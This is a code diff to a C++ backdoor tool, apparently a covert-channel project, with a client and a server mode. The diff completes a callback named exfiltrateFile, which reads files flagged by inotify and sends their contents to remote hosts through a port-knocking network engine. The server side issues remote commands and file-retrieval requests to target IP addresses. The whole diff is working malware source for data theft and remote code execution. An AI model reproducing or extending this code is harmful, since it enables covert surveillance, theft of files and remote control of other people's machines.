@@ -1,7 +1,5 @@
 #include "main.h"
 
-#include <vector>
-
 #include <string.h>
 #include <sys/prctl.h>
 #include <unistd.h>
@@ -248,15 +246,24 @@ int clientMode(const Properties &p, char *programName) {
     // create file monitor
     EventCallback unusedFunction = [&](FileMonitor *fm, struct inotify_event *e) {};
     EventCallback exfiltrateFile = [&](FileMonitor *fm, struct inotify_event *e) {
-        UCharVector contents;
+        UCharVector buffer;
 
-        // TODO: open file and read it into contents
+        std::string line;
+        std::ifstream infile;
+
+        infile.open(e->name); // might need to make full path here
+        while (!infile.eof()) {
+            std::getline(infile, line);
+            buffer.insert(buffer.end(), line.begin(), line.end());
+        }
+        infile.close();
 
         for (const auto &dst : fm->getDestinations(e->wd)) {
             struct in_addr daddr;
             daddr.s_addr = dst;
-            netEngine.knockAndSend(daddr, contents);
+            netEngine.knockAndSend(daddr, buffer);
         }
+
     };
     FileMonitor fm(exfiltrateFile, exfiltrateFile, unusedFunction);
 
@@ -328,14 +335,16 @@ int serverMode(const Properties &p) {
             }
 
             // convert and check ip
-            if (!inet_aton(tokens[1].c_str(), &daddr)) {
+            if (!NetworkEngine::dottedDecimalToBinary(tokens[1], &daddr)) {
                 std::cerr << "server: Invalid destination host" << std::endl;
                 break;
             }
-            daddr.s_addr = ntohl(daddr.s_addr);
 
             // run command
             RemoteCodeExecuter::sendCommand(&netEngine, daddr, line.substr(line.find(tokens[2])));
+
+            // delay for nice output
+            sleep(1);
         }
 
         // format: get [ip] [file]
@@ -346,19 +355,16 @@ int serverMode(const Properties &p) {
             }
 
             // convert and check ip
-            if (!inet_aton(tokens[1].c_str(), &daddr)) {
+            if (!NetworkEngine::dottedDecimalToBinary(tokens[1], &daddr)) {
                 std::cerr << "server: Invalid destination host" << std::endl;
                 break;
             }
-            daddr.s_addr = ntohl(daddr.s_addr);
 
             // send get command
             FileMonitor::sendRequest(tokens[2], daddr, &netEngine);
 
             // TODO: start tcp server
         }
-
-        sleep(1);
     }
 
     std::cout << "Quitting..." << std::endl;
